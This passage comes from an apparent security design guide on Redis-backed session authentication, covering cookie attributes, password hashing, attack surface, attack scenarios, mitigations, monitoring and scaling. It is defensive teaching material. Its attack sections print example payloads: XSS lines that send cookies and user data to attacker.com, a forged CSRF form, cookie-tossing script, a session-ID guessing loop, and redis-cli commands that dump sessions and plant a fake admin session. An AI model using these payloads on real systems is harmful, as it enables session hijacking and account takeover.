| CSRF token (form/header) | Client (untrusted) | Only if it matches session-stored value | Constant-time comparison vs. session value |
| X-Forwarded-For (header) | nginx (semi-trusted) | Only if nginx is the only source | Strip client-set XFF; take only last IP nginx adds |
| Roles (session) | Redis (server-written) | YES | Loaded from DB at login time; no client influence |

The critical insight: **the session ID cookie is an opaque pointer, not a data source**. The client cannot influence session content by modifying the cookie value (they'd get a Redis miss or someone else's session — collision probability ~1/2^256 with proper entropy).

---

## 7. Security Controls

### Cookie Attributes — Every One Matters

```
Set-Cookie: session_id=<value>;
            Path=/;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=86400;
            Domain=app.example.com
```

**`HttpOnly`**: Browser refuses to expose this cookie to JavaScript: `document.cookie` does not include it. XSS cannot steal the session cookie directly. Without `HttpOnly`: a single XSS payload (`fetch('https://attacker.com?c=' + document.cookie)`) steals all sessions.

**`Secure`**: Browser only sends this cookie over HTTPS connections. Never over HTTP. Without `Secure`: an SSLstrip downgrade attack allows the session cookie to be captured in plaintext.

**`SameSite=Lax`**: Cross-site requests (from other domains) do NOT include this cookie, EXCEPT for top-level navigations using safe methods (GET). This prevents most CSRF attacks: a forged POST from `evil.com` to `app.example.com` will not carry the session cookie.
- `SameSite=Strict`: Never sends on cross-site requests, including top-level GET navigations. More secure but breaks "share a link" flows.
- `SameSite=None`: Cookie sent on all cross-site requests. Requires `Secure`. Necessary for cross-site embedded iframes or OAuth flows.

**`Max-Age=86400`**: Browser deletes the cookie 86400 seconds from receipt. This is a client-side timeout — the server's Redis TTL is the authoritative timeout. Both should match.

**`Domain=app.example.com`**: Cookie sent only to this exact hostname. If set to `.example.com`, the cookie is sent to all subdomains — expands attack surface significantly. A subdomain compromise or takeover can then set cookies for all services.

**`__Host-` cookie prefix (most secure):**
```
Set-Cookie: __Host-session_id=...; Secure; Path=/; HttpOnly
```
NO `Domain` attribute allowed. The cookie is automatically scoped to the exact host. A subdomain cannot set or override a `__Host-` prefixed cookie.

---

### Password Hashing — Argon2id

Argon2id is a memory-hard, parallelism-hard KDF. PHC string format stored:

```
$argon2id$v=19$m=65536,t=3,p=4$<16B base64 salt>$<32B base64 hash>
```

- `m=65536`: 64MB of memory per hash operation. At 10GB GPU memory: only 156 parallel attempts simultaneously.
- `t=3`: 3 passes over the memory buffer.
- `p=4`: 4 parallel threads on the server side.
- Salt: 16 bytes of CSPRNG output, unique per password. Prevents rainbow table attacks.

**Why not bcrypt?**
- bcrypt truncates passwords at 72 bytes silently.
- bcrypt's memory usage is fixed at 4KB — GPUs can run thousands of bcrypt computations simultaneously.
- Argon2id's 64MB memory requirement kills GPU parallelism.

---

### Encryption at Rest

**Database (PostgreSQL):**
- TDE (Transparent Data Encryption) via filesystem encryption (LUKS on Linux) or cloud-managed (AWS RDS encryption with KMS).
- Individual column encryption for highly sensitive fields using pgcrypto.

**Redis:**
- Redis persistence files (RDB/AOF): encrypted at rest on the filesystem.
- AWS ElastiCache encryption-at-rest: AES-256, enabled at cluster creation.
- Individual field encryption: For highly sensitive session data, encrypt specific fields within the session JSON before storing in Redis.

---

### Secrets Handling

**Application secrets:**
```
AWS Secrets Manager (or HashiCorp Vault)
  │ IAM role authentication (EC2 instance profile / EKS service account)
  │ One call at startup, cached in process memory
  ▼
Application process memory
  │ Used for DB/Redis connections
  │ NEVER logged, NEVER in environment variables exported to subprocesses
  │ NEVER in config files committed to version control
  ▼
Connection pools (DB, Redis)
  (established at startup using the retrieved credentials)
```

**Environment variables vs. Secrets Manager:**
- Environment variables: visible in `/proc/self/environ` on Linux, in process listings, in crash dumps, in Docker inspect. Do not use for production secrets.
- Secrets Manager: encrypted at rest, access-logged, IAM-controlled, rotation-capable.

---

## 8. Attack Surface Mapping

### All Entry Points

```
EXTERNAL (Internet-accessible) ATTACK SURFACE
=======================================================================

  Authentication Endpoints:
  POST /auth/login            <- email + password (primary credential endpoint)
  POST /auth/logout           <- session cookie (requires valid session)
  GET  /auth/logout           <- some apps allow GET logout (CSRF risk)
  POST /auth/password/reset   <- email (triggers reset flow)
  PUT  /auth/password         <- session + new password
  POST /auth/mfa/verify       <- session + MFA code

  Session-Dependent Endpoints:
  GET/POST/PUT/DELETE /api/*  <- all require session cookie

  Public Endpoints:
  GET  /login                 <- serves login form (CSRF token injection)
  GET  /.well-known/*         <- security.txt, etc.
  GET  /static/*              <- served from CDN; no session

  Indirect Surfaces:
  - DNS (hijacking -> MitM)
  - TLS CA (cert mis-issuance -> MitM)
  - CDN (cache poisoning)
  - Email provider (password reset token delivery)
  - Browser (XSS, clickjacking)

INTERNAL (VPC / private network) ATTACK SURFACE
=======================================================================

  Redis:        port 6380 (TLS) -- session store; compromise = all sessions
  PostgreSQL:   port 5432       -- user records; compromise = all passwords
  Kafka/SQS:    internal        -- audit events
  App servers:  port 3000       -- behind nginx; no direct internet exposure
  nginx:        management port -- must not be internet-accessible

TRUST BOUNDARIES
=======================================================================

  [TB-1] Internet -> nginx:
    ZERO TRUST. All input untrusted. TLS terminates here.
    nginx strips/rewrites sensitive headers before passing to app.

  [TB-2] nginx -> App Server:
    SEMI-TRUSTED (same VPC). Plain HTTP or re-encrypted.
    App server trusts X-Forwarded-For ONLY from nginx's IP range.
    If app server is directly accessible (bypassing nginx), all WAF/rate-limit
    protections are bypassed.

  [TB-3] App Server -> Redis:
    TRUSTED (private subnet). AUTH required. TLS.
    Redis runs no application logic -- it trusts whatever data the app writes.
    Compromised app server = ability to read/write all sessions.

  [TB-4] App Server -> PostgreSQL:
    TRUSTED (private subnet). DB user auth (pg_hba.conf). TLS.
    DB user should have only SELECT/INSERT/UPDATE on specific tables.
    No DROP, no TRUNCATE, no superuser access.

  [TB-5] Browser -> Any Endpoint:
    ZERO TRUST. Session cookie is the only trust credential.
    CORS + SameSite + CSRF tokens enforce origin boundaries.
```

### Attack Surface Diagram

```
                              INTERNET
                                 │
                     ┌───────────▼────────────┐
                     │  CDN / DDoS Protection  │  <- HTTP flood, volumetric DDoS
                     │  (Cloudflare / Shield)  │    Layer 7 attacks
                     └───────────┬────────────┘
                                 │ HTTPS only
                     ┌───────────▼────────────┐
                     │    nginx (TLS term)     │  <- TLS downgrade, cert issues
                     │    Rate limiting        │    Host header injection
                     │    WAF rules            │    HTTP request smuggling
                     └──────┬──────────┬───────┘
                            │          │ (round-robin)
              ┌─────────────▼──┐  ┌────▼──────────────┐
              │  App Server 1  │  │  App Server N      │
              │                │  │                    │
              │  ATTACK PATHS: │  │  (same attacks)    │
              │  - SQLi        │  └────────────────────┘
              │  - CSRF        │           │
              │  - Session fix.│           │ (shared stores)
              │  - XSS->cookie │           │
              └──────┬─────────┘           │
                     │                     │
          ┌──────────▼─────────────────────▼──────┐
          │                                        │
     ┌────▼──────────┐                  ┌──────────▼──────┐
     │  Redis        │                  │  PostgreSQL      │
     │  (sessions)   │                  │  (users, data)   │
     │               │                  │                  │
     │ ATTACK:       │                  │ ATTACK:          │
     │ - Dump all    │                  │ - SQL injection   │
     │   sessions    │                  │   (parameterized  │
     │ - Inject fake │                  │   prevents most)  │
     │   session     │                  │ - Credential      │
     │ - Mass logout │                  │   dump (pg_dump)  │
     └───────────────┘                  └──────────────────┘

  [TB-1: Internet->nginx]  [TB-2: nginx->App]  [TB-3/4: App->Stores]
  Zero trust                Semi-trusted         Trusted + least privilege
```

---

## 9. Attack Scenarios (Very Detailed)

### 9.1 — Session Fixation

**Attacker Assumptions:**
- The application creates a session before authentication (e.g., to store CSRF token for the login form).
- The application does NOT generate a new session ID upon successful authentication.
- The attacker can make the victim use a specific session ID.

**Step-by-Step Execution:**

1. Attacker visits `https://app.example.com/login`. Server creates a pre-authentication session in Redis: `session:PRE_AUTH_ID` with anonymous state. Sends `Set-Cookie: session_id=PRE_AUTH_ID`.

2. Attacker extracts `PRE_AUTH_ID` from their own browser.

3. Attacker tricks the victim into loading the login page with the known session ID. Methods:
   - URL parameter if the app accepts session ID in the URL: `?session_id=PRE_AUTH_ID` (extremely bad practice).
   - Cookie injection via subdomain: Attacker controls `evil.example.com` and sets a cookie for `.example.com`: `document.cookie = "session_id=PRE_AUTH_ID; domain=.example.com"`.
   - Response header injection: If the app has a header injection vulnerability.

4. Victim authenticates successfully. The server updates `session:PRE_AUTH_ID` with the victim's user data but keeps the same key.

5. Attacker's browser, which still has `PRE_AUTH_ID` as its session cookie, is now authenticated as the victim.

**Why This Works:** The session ID is the authentication credential. If the server doesn't rotate it on authentication, whoever knows the pre-auth session ID also knows the post-auth session ID.

**Where Detection Could Happen:** Near-impossible to detect without monitoring for IP changes within sessions. Anomaly: same session ID used from two very different IPs shortly after login.

**Mitigation:**
```python
# On successful authentication -- ALWAYS generate a new session ID
old_session_data = request.session.copy()  # Preserve any pre-auth data
request.session.invalidate()               # Delete old session from Redis
new_session_id = generate_session_id()     # CSPRNG(32 bytes)
request.session = Session(new_session_id)  # New ID, blank state
request.session.update(old_session_data)   # Restore needed pre-auth data
request.session["user_id"] = user.id       # Add auth data
request.session.save()                     # Redis SET new_session_id
```

---

### 9.2 — Session Hijacking via XSS

**Attacker Assumptions:**
- The application has an XSS vulnerability.
- The session cookie is NOT `HttpOnly`.

**Step-by-Step Execution:**

1. Attacker finds a reflected XSS vulnerability in a search parameter.

2. Payload to steal the session cookie (if NOT HttpOnly):
   ```javascript
   fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
   ```

3. Victim clicks the attacker's crafted link. The script executes in the victim's browser context.

4. Victim's session cookie value is sent to the attacker's server.

5. Attacker uses `Cookie: session_id=<stolen_value>` in curl. Full authenticated access.

**If `HttpOnly` is set (correct configuration):**
The attacker can no longer read `document.cookie`. Instead:
- **Direct API calls from the victim's browser context**: The malicious script can call authenticated APIs directly — the browser automatically includes HttpOnly cookies in same-origin fetch requests.
  ```javascript
  // XSS in app.example.com context -- cookie is automatically included
  fetch('/api/user/data').then(r => r.json()).then(data =>
    fetch('https://attacker.com/exfil?data=' + JSON.stringify(data))
  )
  ```

`HttpOnly` prevents session theft (attacker using the session from their own browser) but doesn't prevent data exfiltration using the victim's browser as an authenticated proxy.

**Detection:** CSP violations if `connect-src` blocks unknown domains. Session used from two different IPs simultaneously. Unusual API call patterns (dumping large amounts of data).

---

### 9.3 — CSRF (Cross-Site Request Forgery)

**Attacker Assumptions:**
- The victim is logged into `app.example.com`.
- The session cookie has `SameSite=None` or no SameSite attribute.
- The targeted action has no CSRF protection.

**Step-by-Step Execution:**

1. Victim is logged into `app.example.com`. Their browser has a session cookie.

2. Victim visits `https://evil.com` while still logged in.

3. `evil.com` contains:
   ```html
   <form action="https://app.example.com/api/account/transfer"
         method="POST" id="attack">
     <input type="hidden" name="amount" value="10000">
     <input type="hidden" name="to_account" value="attacker-account">
   </form>
   <script>document.getElementById('attack').submit();</script>
   ```

4. Browser automatically submits the form. Because the session cookie has `SameSite=None`, it's included in the cross-origin POST request.

5. `app.example.com` receives the POST with the victim's session cookie. Without CSRF protection: processes the transfer as the victim.

**Why `SameSite=Lax` prevents this:** `SameSite=Lax` prevents the session cookie from being sent on cross-site POST requests. The POST from `evil.com` to `app.example.com` is a cross-site non-safe method request → cookie not sent → unauthenticated → rejected.

**Detection:** CSRF token mismatch logged. Alert on spikes. `Origin`/`Referer` header doesn't match the application's domain.

---

### 9.4 — Session Enumeration (Low-Entropy Session IDs)

**Attacker Assumptions:**
- The application generates session IDs with insufficient entropy (e.g., 32-bit counter, timestamp-based, or MD5 of user ID + timestamp).
- The attacker can make many requests without rate limiting.

**Step-by-Step Execution (timestamp-based session ID):**

If the session ID is generated as `md5(user_id + timestamp_ms)`:

1. Attacker knows approximate login times (e.g., business hours).
2. Generates candidate session IDs for timestamps in a range:
   ```python
   for ts in range(target_timestamp - 60000, target_timestamp + 60000):
       for user_id in range(1, 100000):
           candidate = md5(f"{user_id}{ts}").hexdigest()
           # Try this as a session ID
   ```
3. For each candidate, sends: `GET /api/me` with `Cookie: session_id=<candidate>`.
4. If Redis returns a session → attacker has found a valid session.

**With 256-bit CSPRNG session IDs:** The search space is 2^256. Even at 1 billion attempts per second, it would take longer than the age of the universe. This attack is computationally infeasible.

**Detection:** High rate of 401 responses from a single IP → rate limit, block. Distributed attack: anomalously high global 401 rate on session-dependent endpoints.

---

### 9.5 — Redis Compromise → Mass Session Theft

**Attacker Assumptions:**
- Attacker has gained access to the Redis instance (misconfiguration exposing Redis to the internet, or lateral movement from a compromised app server).
- Redis has no authentication or a weak password.

**Step-by-Step Execution:**

1. Attacker connects: `redis-cli -h redis.internal.example.com -p 6380`. Immediate access if no auth.

2. Enumerate all session keys:
   ```
   KEYS session:*
   ```
   Returns all active session keys. On a system with 100,000 active users: 100,000 keys.

3. Dump all sessions:
   ```
   for key in $(redis-cli KEYS "session:*"); do
     echo "$key: $(redis-cli GET $key)"
   done
   ```

4. Extract `user_id` and `roles` from each session JSON. Identify admin sessions.

5. Attacker uses the session ID (extracted from the Redis key suffix) with `Cookie: session_id=<extracted_id>`.

6. All 100,000 active users are simultaneously compromised.

**Injecting a fake admin session (if write access):**
```
SET "session:ATTACKER_CHOSEN_ID" '{"user_id":"admin-uuid","roles":["admin"]}' EX 86400
```
Use `session_id=ATTACKER_CHOSEN_ID` in browser. The app trusts Redis — this is now a valid admin session.

**Detection:** Redis AUTH failures. `KEYS session:*` command in Redis slow log (O(N) — always slow; should alert). Egress data spike from Redis network interface. Abnormal number of simultaneous active sessions for a single user.

---

### 9.6 — Timing Attack on CSRF Token Comparison

**Attacker Assumptions:**
- The server compares the submitted CSRF token against the session-stored token character by character with early exit on first mismatch.
- Attacker can measure request latency with high precision.

**Step-by-Step Execution:**

1. Attacker has a valid session (legitimate user).
2. Submits POST requests with CSRF tokens that differ by the first character:
   - Token starting with `a...`: measure response time.
   - Token starting with `b...`: measure response time.
3. If the comparison is not constant-time and `b` happens to match the first character of the real CSRF token, the response is marginally slower (one more comparison step before mismatch).
4. Repeat for each character position to recover the CSRF token.
5. Use the recovered CSRF token to submit legitimate-looking CSRF attacks.

**Why this is realistic for CSRF but not session IDs:** The session ID lookup is a Redis hash table O(1) — not character-by-character. But CSRF token comparison in application code (`if token == stored_token`) IS character-by-character in most languages with string equality.

**Mitigation:**
```python
import hmac

# WRONG -- early exit on first mismatch
if submitted_csrf_token == session_csrf_token:
    pass

# CORRECT -- constant-time comparison
if not hmac.compare_digest(submitted_csrf_token, session_csrf_token):
    raise CSRFError()
```

**Detection:** Timing attacks require thousands of high-precision measurements. Anomaly: same endpoint called thousands of times with slightly varying tokens from the same session.

---

### 9.7 — Cookie Tossing (Subdomain Cookie Injection)

**Attacker Assumptions:**
- The attacker controls a subdomain: `evil.example.com`.
- The session cookie is set for `.example.com` (parent domain).

**Step-by-Step Execution:**

1. The legitimate app sets cookies for `.example.com`:
   ```
   Set-Cookie: session_id=LEGITIMATE_ID; Domain=.example.com; HttpOnly; Secure
   ```

2. Attacker controls `evil.example.com`. From this origin, they set cookies for `.example.com`:
   ```javascript
   // On evil.example.com:
   document.cookie = "session_id=ATTACKER_CHOSEN_ID; domain=.example.com; path=/";
   ```

3. When the victim visits `app.example.com`, the browser sends **both** cookies:
   ```
   Cookie: session_id=LEGITIMATE_ID; session_id=ATTACKER_CHOSEN_ID
   ```

4. The server processes cookies in order. If it takes the last match, it uses the attacker's value (session fixation if attacker controls a valid session for that ID).

**Detection:** Multiple cookies with the same name in a single request — log and alert. Monitor for subdomain takeover on `*.example.com` (DNS monitoring for dangling CNAME records).

---

### 9.8 — Brute Force / Credential Stuffing

**Attacker Assumptions:**
- Attacker has a list of email:password pairs from a previous breach.
- Rate limiting is IP-based only, and the attacker uses a distributed botnet.
- No account lockout or CAPTCHA.

**Step-by-Step Execution:**

1. Attacker distributes 100,000 email:password pairs across 100,000 proxy IPs.

2. Each IP sends one login request. IP-based rate limiting (5 attempts per IP per 15 minutes) sees only 1 attempt per IP — not triggered.

3. Per-email rate limiting (if implemented) sees 1 attempt per email — not triggered for individual accounts.

4. If 2% of the breach list is reused on this site: 2,000 successful logins.

5. Sessions are created for all 2,000 compromised accounts. Legitimate users don't know.

**Detection:**
- Global login failure rate spike: 100,000 failures in 15 minutes is anomalous. Alert on global failure rate.
- Same password tried for >10 distinct emails in 1 hour (password spray pattern).
- New device + new location for successful logins: flag for review.
- Per-email failure rate even at 1/hour across 100K emails simultaneously is a signal.

---

## 10. Failure Points

### Under Load

**Redis becomes a bottleneck:** Every authenticated request requires a Redis GET. At 10,000 req/sec across 50 app instances: 10,000 Redis operations/second. Redis single-threaded throughput: ~100,000 ops/sec per node. This is comfortable until Redis is under-provisioned or doing other work.

**Failure mode:** Redis overloaded → session lookups time out → app servers treat all sessions as invalid → all users effectively logged out. The app cannot distinguish between "Redis is slow" and "no session exists."

**Argon2id saturates login capacity:** A single app instance handles ~10 Argon2id verifications per second (200ms each, 2 dedicated threads). A traffic spike of 100 login attempts/second to a 2-instance cluster = impossible to serve.

**PostgreSQL connection pool exhaustion:** Login requires a DB write (`UPDATE last_login_at`). At high login volume, all DB connections consumed by these updates. Normal API queries queue. Mitigation: Make `UPDATE last_login_at` asynchronous. PgBouncer connection pooling in transaction-mode.

### Under Attack

**Session store targeted DDoS:** Attacker sends millions of login requests, each generating a session in Redis. At 1MB per 1000 sessions, 1 million bot sessions = 1GB of Redis memory. Redis runs out → `maxmemory` policy evicts legitimate sessions → real users logged out.

Mitigation: `maxmemory-policy: volatile-lru`. Per-IP session creation rate limiting. Bot detection (CAPTCHA on login). Alert at 80% memory.

**Redis AUTH brute force:** An exposed Redis instance being brute-forced from a compromised host.

Mitigation: Strong Redis password (128-bit random). Network-level firewall: Redis port accessible only from app server IP ranges. Redis ACLs (Redis 6+).

### Common Misconfigurations

| Misconfiguration | Impact | Fix |
|---|---|---|
| Session ID in URL (`/dashboard?session=...`) | Session ID in logs, referrer headers, browser history | Cookies only. Never URL parameters. |
| Session cookie without `HttpOnly` | XSS steals session ID via `document.cookie` | Always set `HttpOnly` |
| Session cookie without `Secure` | Session ID sent over HTTP (SSLstrip attack) | Always set `Secure` |
| Session cookie without `SameSite` | CSRF (browsers defaulting to None) | Always set `SameSite=Lax` minimum |
| No session ID rotation on auth | Session fixation attack | Always generate new session ID on login |
| No CSRF protection | CSRF on any state-changing operation | CSRF tokens or SameSite=Strict |
| Redis without AUTH | Any host that can reach Redis = full session dump | `requirepass <256-bit-random>` |
| Redis without TLS | Session data in plaintext on network | TLS on Redis connections |
| Long absolute session TTL (30 days) | Stolen session valid for 30 days | 24 hours maximum absolute TTL |
| No idle timeout | Inactive sessions never expire | Sliding TTL; update `last_activity_at` and reset EXPIRE |
| Storing PII in session without encryption | PII in Redis in plaintext | Encrypt sensitive session fields |
| Session data from client (cookie-based sessions) | Attacker modifies session data | Never store session data in the cookie |
| `GET /logout` endpoint | CSRF can force logout (DoS on session) | `POST /logout` only, with CSRF token |
| No concurrent session limit | Account sharing; session farm attacks | Limit concurrent sessions per user (3-5) |

---

## 11. Mitigations

### Defense-in-Depth Strategy

**Layer 1 — Session Integrity:**
- Session IDs: 256-bit CSPRNG output, base64url-encoded.
- Session ID rotation on every authentication event.
- Session data stored server-side in Redis only. No client-side storage of session state.
- Absolute TTL (24 hours) AND idle TTL (30 minutes sliding). Both enforced.

**Layer 2 — Cookie Security:**
- `HttpOnly`: Prevents XSS-based cookie theft.
- `Secure`: Prevents transmission over HTTP.
- `SameSite=Lax`: Prevents most CSRF.
- `Max-Age` matching Redis TTL.
- Cookie scoped to the specific host (`Domain=app.example.com`).

**Layer 3 — CSRF Protection:**
- Server-side CSRF tokens stored in session.
- All state-changing endpoints: POST/PUT/DELETE only. No side effects on GET.
- `POST /logout` not `GET /logout`.
- `Origin` header validation as additional check.

**Layer 4 — Transport Security:**
- TLS 1.3 everywhere. Disable TLS 1.0 and 1.1.
- HSTS with `preload`. Submit to preload list.
- OCSP stapling. Certificate auto-renewal.

**Layer 5 — Credential Protection:**
- Argon2id with calibrated parameters (target 200-300ms on server hardware).
- Password length limits: 8–1024 characters.
- Breach detection: check against HaveIBeenPwned k-anonymity API.
- Account lockout: temporary (not permanent) after N failures.
- MFA: TOTP or WebAuthn as second factor.

**Layer 6 — Session Store Security:**
- Redis: `requirepass`, TLS, network firewall (only app servers can connect), Redis ACLs.
- Session data: encrypt sensitive fields (email, IP) at the application layer before storing.
- Separate Redis instances for sessions vs. cache vs. rate limiting (blast radius reduction).

**Layer 7 — Monitoring and Response:**
- Alert on Redis session write failures → login path is broken.
- Alert on abnormal session creation rate (bot attack).
- Alert on multiple session IDs for the same user from different geographies.
- Session invalidation API for incident response: bulk-revoke sessions for a user or all users.

### Engineering Tradeoffs

| Decision | Security Benefit | Engineering Cost |
|---|---|---|
| Sliding TTL | Sessions don't expire on active users | Redis EXPIRE + write on every request |
| CSRF token in session | Reliable CSRF protection | Stateful; requires session for all forms including login form |
| Per-request DB check for `is_active` | Immediate account disable effect | 1 DB read per request; latency + DB load |
| Encrypted session fields in Redis | PII protected even if Redis is dumped | Encryption/decryption overhead; key management |
| `SameSite=Strict` vs. `Lax` | Better CSRF protection | Breaks OAuth callbacks, email magic links |
| Short idle timeout (15 min) | Reduced exposure window for stolen sessions | Users logged out during legitimate inactivity |
| Concurrent session limit (3 max) | Limits blast radius | Users on multiple devices may be forced to logout |

---

## 12. Observability

### Structured Log Events

```json
// Login success
{
  "timestamp": "2024-11-15T10:23:45.123Z",
  "event": "auth.login.success",
  "request_id": "req-abc123",
  "session_id_hash": "sha256:a1b2...",    // hash, never raw session ID
  "user_id": "uuid-xyz",
  "ip_hash": "sha256:c3d4...",            // hashed for privacy
  "ip_geo": "US-CA",                      // region only
  "ua_hash": "sha256:e5f6...",
  "new_device": true,
  "duration_ms": 312,
  "argon2_ms": 289
}

// Login failure
{
  "event": "auth.login.failure",
  "reason": "bad_credentials",           // NOT which field was wrong
  "email_hash": "sha256:...",            // hash -- don't log email in plaintext
  "ip_hash": "sha256:...",
  "attempt_number": 3
}

// Security events (always log, never sample)
{
  "event": "auth.csrf.failure",
  "expected_hash": "sha256:...",
  "received_hash": "sha256:...",
  "user_id": "uuid-xyz",
  "ip_hash": "sha256:..."
}

{
  "event": "auth.session.fixation_prevented",
  "old_session_id_hash": "sha256:...",
  "new_session_id_hash": "sha256:..."
}
```

**What NEVER appears in logs:**
- Raw session ID values (equivalent to a password).
- Raw passwords.
- Full IP addresses in high-volume logs (PII under GDPR/CCPA — hash them).
- Full email addresses in high-volume security logs.
- CSRF tokens.

---

### Metrics (Prometheus)

```
# Counters
auth_login_attempts_total{outcome="success|failure", reason="..."}
auth_session_created_total
auth_session_destroyed_total{reason="logout|timeout|forced|password_change"}
auth_session_lookup_total{result="hit|miss|error"}
auth_csrf_check_total{outcome="pass|fail"}
auth_rate_limit_triggered_total{endpoint="..."}

# Histograms (latency percentiles)
auth_login_duration_seconds                    # total login handler time
auth_argon2_duration_seconds                   # password verification specifically
auth_redis_operation_duration_seconds{op="GET|SET|DEL|EXPIRE"}
auth_db_query_duration_seconds{query="user_lookup|update_last_login"}
auth_session_lookup_duration_seconds           # full session middleware time per request

# Gauges
auth_active_sessions_count
auth_redis_memory_used_bytes
auth_redis_connected_clients
auth_sessions_near_expiry_count               # sessions with TTL < 300s

# Error rates
auth_redis_errors_total{type="timeout|connection|oom"}
auth_db_errors_total{type="timeout|connection|query_error"}
```

---

### Distributed Traces

OpenTelemetry trace for a login request:

```
HTTP POST /auth/login [340ms]
  ├── middleware.rate_limit [1.2ms]
  │     └── redis.INCR + EXPIRE [0.9ms]
  ├── middleware.body_parse [0.3ms]
  ├── middleware.session_load [1.1ms]
  │     └── redis.GET session:(none) [0.8ms] -> nil
  ├── handler.login [337ms]
  │     ├── db.query.user_lookup [6.2ms]
  │     │     └── postgres.SELECT [5.8ms]
  │     ├── crypto.argon2_verify [289ms]
  │     ├── crypto.session_id_generate [0.1ms]
  │     ├── redis.SET session:new_id [0.9ms]
  │     └── event.publish login_success [0.2ms] (async)
  └── middleware.set_headers [0.1ms]
```

For authenticated API requests (sampled at 1%):

```
HTTP GET /api/user/profile [12ms]
  ├── middleware.session_load [1.4ms]
  │     ├── redis.GET session:xxx [0.9ms] -> hit
  │     └── redis.EXPIRE session:xxx [0.4ms] (sliding TTL reset)
  ├── middleware.csrf_check [0.1ms]
  ├── middleware.auth_guard [0.05ms] (in-memory check)
  └── handler.get_profile [10ms]
        └── db.query.user_profile [9ms]
```

The trace shows Redis (`1.4ms`) is the dominant overhead for authenticated requests, not application code. This is expected and acceptable.

---

### Alerting Rules

| Metric / Event | Alert? | Severity | Threshold |
|---|---|---|---|
| `auth_login_attempts_total{outcome="failure"}` rate > 1000/min | YES | HIGH | Credential stuffing attack |
| `auth_session_lookup_total{result="error"}` > 0 | YES | CRITICAL | Redis is down -- all auth broken |
| `auth_redis_memory_used_bytes` > 80% of max | YES | HIGH | OOM risk; sessions may be evicted |
| `auth_redis_operation_duration_seconds` p99 > 10ms | YES | MEDIUM | Redis performance degradation |
| `auth_csrf_check_total{outcome="fail"}` rate spike | YES | HIGH | CSRF attack in progress |
| `auth.session.fixation_prevented` any event | YES | HIGH | Session fixation attempt |
| Same `user_id` login from 2+ countries within 1 hour | YES | MEDIUM | Account takeover suspected |
| `auth_login_attempts_total{outcome="failure"}` per email > 5/15min | YES | LOW | Account targeted |
| Normal login success during business hours | NO | -- | Expected |
| Session TTL refresh on active sessions | NO | -- | Expected; log at DEBUG only |
| Single login failure | NO | -- | Normal typos |
| `auth_argon2_duration_seconds` p99 > 500ms | YES | MEDIUM | Server overloaded |

---

## 13. Scaling Considerations

### The Centralized Session Store Problem

Session-based auth's fundamental scaling challenge: every request requires a round-trip to the session store. As application instances grow, they all contend for the same Redis.

```
1 app instance   ->  1,000 req/sec  ->  1,000 Redis ops/sec  (trivial)
10 app instances -> 10,000 req/sec  -> 10,000 Redis ops/sec  (comfortable)
100 instances    -> 100,000 req/sec -> 100,000 Redis ops/sec (Redis limit)
200 instances    -> 200,000 req/sec -> 200,000 Redis ops/sec (Redis bottleneck)
```

**Redis single-node capacity: ~100,000 ops/second** (simple GET/SET). Beyond this, a single Redis node becomes the bottleneck.

---

### Horizontal Scaling Strategies

**Redis Cluster (hash slot partitioning):**

Redis Cluster distributes keys across 16,384 hash slots. Each node is responsible for a range:

```
Node A (master): slots 0-5460
Node B (master): slots 5461-10922
Node C (master): slots 10923-16383
```

Session key `session:abc123` is hashed (CRC16 of the key) → a slot number → routed to the responsible node. With 3 nodes: combined throughput ~300,000 ops/sec.

**Replication for HA:** Each master has 1-3 replicas. If a master fails, a replica is promoted. During failover (~10-30 seconds), sessions on the failed node are temporarily inaccessible. Sessions are not lost if the replica has them.

**Redis Sentinel (simpler HA without sharding):** Redis Sentinel monitors a master and its replicas. On master failure, Sentinel promotes a replica. Single point of reads/writes. Simpler to operate; appropriate for <100K sessions.

---

### Read-Only Request Caching (Reducing Redis Pressure)

```
Request arrives with session cookie
  │
  ▼
Check local in-process cache (LRU, max 1000 entries, TTL 30s)
  │
  ├── HIT (session data, <30s old): proceed without Redis call
  │
  └── MISS: Redis GET -> update in-process cache -> proceed
```

**Tradeoffs:**
- 30-second staleness: a revoked session may be accepted for up to 30 seconds after revocation.
- Memory: 1000 sessions x ~500 bytes = 500KB per app instance. Negligible.
- Benefit: 80% of requests (users who make multiple requests within 30 seconds) skip the Redis call entirely. Redis load drops 80%.

For logout, revocation must invalidate both Redis AND any in-process caches. The 30-second staleness window is acceptable for most applications, not for high-security financial systems.

---

### Stateless Validation vs. Stateful Sessions

```
Traditional session-based system:
  User Request
    |
    v
  Session Lookup (Redis, REQUIRED for every request)
    |
    v
  Shared Redis cluster (bottleneck, potential SPOF)
    |
    v
  Handle Request

JWT system (no blacklist):
  User Request
    |
    v
  JWT Validate (cryptographic, in-process, ~1ms)
    |
    v
  Handle Request
  (No shared state required -- pure CPU computation)
```

Sessions require shared state. JWTs do not (for validation). The architectural choice depends on whether instant revocation is a hard requirement or whether short TTLs (15 minutes) provide acceptable security guarantees.

---

### Consistency Tradeoffs

| Scenario | Consistency Approach | Tradeoff |
|---|---|---|
| Session creation | Write to Redis primary before responding | Synchronous; adds latency; correct |
| Session reads | Read from Redis primary OR replica | Replica lag: session might not be found immediately after creation |
| Session deletion (logout) | Write to Redis primary before responding | Synchronous; correct; ensures immediate revocation |
| `last_activity_at` update | Fire-and-forget after response | Slightly stale; acceptable |

**Redis replication lag for sessions:** Async replication means the primary writes the session, then asynchronously replicates to replicas. If the primary fails before replication completes, the replica has a stale state — some sessions may be missing on failover. Those users must re-login. Acceptable for sessions.

For higher durability: `WAIT 1 0` after `SET` (wait for at least 1 replica to acknowledge before returning). This adds ~1ms latency but ensures the session is replicated before the cookie is sent.

---

### Database Scaling

**Login path DB dependency:** Only the login flow reads from PostgreSQL (user lookup by email). Can be served by read replicas.

```
nginx
  |
  ├── /auth/login -> App Server -> PostgreSQL PRIMARY (user lookup + last_login update)
  |                  OR
  |                  PostgreSQL REPLICA (user lookup only, if replica lag acceptable)
  |
  └── /api/*     -> App Server -> PostgreSQL REPLICA (read queries)
                             └── PostgreSQL PRIMARY (write operations)
```

**PostgreSQL connection pooling:** PgBouncer in transaction-mode pooling. Each DB connection returned to the pool after each transaction (not held for the duration of the HTTP request). A 100-connection DB pool shared across 50 app instances dramatically reduces DB connection overhead.

---

## 14. Interview Questions

### Q1: Explain the difference between a session cookie and a session ID. What is stored in each, and why does this distinction matter for security?

**Session cookie**: An HTTP cookie sent by the browser on every request. Contains the **session ID** — an opaque, random string. The cookie is ~43-50 bytes. It contains NO user data, NO email, NO roles. It is purely a lookup key.

